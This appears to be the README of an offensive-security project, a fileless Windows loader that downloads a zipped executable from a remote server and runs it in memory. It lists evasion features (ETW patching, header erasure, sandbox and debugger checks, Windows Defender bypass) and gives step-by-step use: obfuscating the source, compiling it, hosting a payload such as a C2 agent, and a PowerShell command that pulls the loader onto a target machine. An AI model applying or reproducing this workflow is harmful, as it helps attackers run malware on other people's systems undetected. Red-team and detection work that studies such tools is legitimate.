### Fileless-Remote-PE-Loader
--------------------------------------
This loader allows to download, unzip, and execute directly in-memory a compressed offensive security tool (x64 PE executable embeded in a zip file) retrieved from a remote web server. It implements several defense evasion techniques (e.g. fileless delivery + reflective PE loading, ETW bypass, sandbox checks) designed to bypass antivirus solutions such as Windows Defender.

#### FEATURES
- Fileless delivery + Reflective PE loading (Downloads, decompresses, and executes in-memory a zipped x64 PE)
- ETW bypass in user-mode (Patching EtwEventWrite functions)
- Dynamic API resolution (Avoids static import of suspicious API 'VirtualAlloc')
- PE header erasure (After mapping the PE into memory, the DOS + NT headers are zeroed out to reduce forensic visibility) 
- Memory protection hardening (Applies section-specific memory permissions i.e. first writable, then switched to execute-only)
- Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
- Compatible with many offensive security tools (x64 EXE, unmanaged code, no GUI) such as C2 agents (e.g. Sliver, Havoc), NanoDump, PPLblade, ...

#### USAGE
- STEP 1 - Obfuscate the source code by removing all comments and 'printf' statements, renaming function and variable names, etc.

- STEP 2 - Compile the source code.  
           <i/>Note: the tool uses the 'miniz.c' library to perform ZIP decompression operations (https://github.com/richgel999/miniz)</i>
```
Example with Visual Studio 2022 Developer Command Prompt v17.14.14:
-------------------------------------------------------------------
c:\path-to-project\Fileless-Remote-PE-Loader> echo IDI_ICON1 ICON "myicon.ico" > appicon.rc
c:\path-to-project\Fileless-Remote-PE-Loader> rc appicon.rc
c:\path-to-project\Fileless-Remote-PE-Loader> cl /TC Fileless-Remote-PE-Loader.c miniz.c /link wininet.lib /MACHINE:X64 /OUT:Fileless-Remote-PE-Loader.exe appicon.res
```

- STEP 3 - Host on a web server the ZIP file embeding the offensive security tool (x64 PE) that you want to execute
```
Examples:
---------
- http://XX.XX.XX.XX:8080/file.zip
- http://XX.XX.XX.XX/file.zip
- https://your.website/file.zip
```
- STEP 4 - Upload the tool 'Fileless-Remote-PE-Loader.exe' on a target Windows machine and create in the same folder an "url.txt" file that contains the url to download your zip file.
		   When you will run the loader, it will download, unzip and execute in-memory your compressed PE file (x64 exe) located on your remote web server ('url.txt' file).
```
1. Download the loader
----------------------
c:\temp> powershell -c "wget -uri https://IP/Fileless-Remote-PE-Loader.exe - OutFile C:\temp\Fileless-Remote-PE-Loader.exe"
c:\temp> echo "http://ip/file.zip" > C:\temp\url.txt

2. Run the loader with the arguments to pass to the PE
------------------------------------------------------
c:\temp> Fileless-Remote-PE-Loader.exe arg1 arg2 [...]
or
2.bis Run the loader without argument
-------------------------------------
c:\temp> Fileless-Remote-PE-Loader.exe
No argument was provided. Press 'Enter' to continue, or press 'Ctrl+C' to exit and relaunch with arguments.
```

#### OPSEC improvement (to do)
- Implement direct or indirect syscalls to improve stealth.
  
#### LICENSE
GNU General Public License v3.0


